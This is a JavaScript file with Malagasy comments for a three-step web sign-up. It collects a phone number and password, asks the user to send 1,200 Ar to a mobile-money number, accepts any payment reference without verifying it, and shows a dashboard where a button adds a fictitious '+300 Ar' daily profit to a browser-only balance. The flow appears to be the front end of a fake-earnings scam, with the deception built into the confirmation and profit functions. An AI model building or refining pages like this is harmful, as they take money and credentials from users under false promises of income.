// Variable hitahirizana ny angon'ny kaonty ampiasaina amin'izao
let currentBalance = 1200;

// Rehefa kitihana ny bouton S'inscrire (Step 1 -> Step 2)
function register() {
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;

    if (phone.trim() === "" || password.trim() === "") {
        alert("⚠️ Azafady fenoina avokoa ny laharana finday sy ny teny miafina.");
        return;
    }

    // Afeno ny Step 1, asehoy ny Step 2
    document.getElementById('form-container').classList.add('hidden');
    document.getElementById('payment-container').classList.remove('hidden');

    // Ovao ny loko an'ny Stepper
    document.getElementById('step1-indicator').classList.remove('active');
    document.getElementById('step2-indicator').classList.add('active');

    // Tehirizo ny laharana ao amin'ny Dashboard
    document.getElementById('user-phone').innerText = phone;
}

// Fanaovana Copier ny laharana finday
function copyNumber() {
    const num = document.getElementById('momo-number').innerText;
    navigator.clipboard.writeText(num);
    alert("📋 Voakopia ny laharana: " + num);
}

// Rehefa ampidirina ny Reference SMS (Step 2 -> Step 3)
function confirmPayment() {
    const reference = document.getElementById('transaction-id').value;

    if (reference.trim() === "") {
        alert("⚠️ Azafady ampidiro ny laharana Référence / ID azonay amin'ny SMS rehefa avy nandefa ny 1 200 Ar ianao.");
        return;
    }

    alert("⚡ Misaotra! Voaray ny Référence-nao: " + reference + ". Tafiditra ny kaontinao!");

    // Afeno ny Step 2, asehoy ny Dashboard
    document.getElementById('payment-container').classList.add('hidden');
    document.getElementById('dashboard-container').classList.remove('hidden');

    // Ovao ny loko an'ny Stepper
    document.getElementById('step2-indicator').classList.remove('active');
    document.getElementById('step3-indicator').classList.add('active');
}

// Fakana ny tombony isan'andro ao amin'ny Dashboard
function claimDailyProfit() {
    currentBalance += 300;
    document.getElementById('user-balance').innerText = currentBalance.toLocaleString('fr-FR') + " Ar";
    alert("🎉 Arahabaina! Tafiditra ao amin'ny solde-nao ny +300 Ar tombony anio!");
}
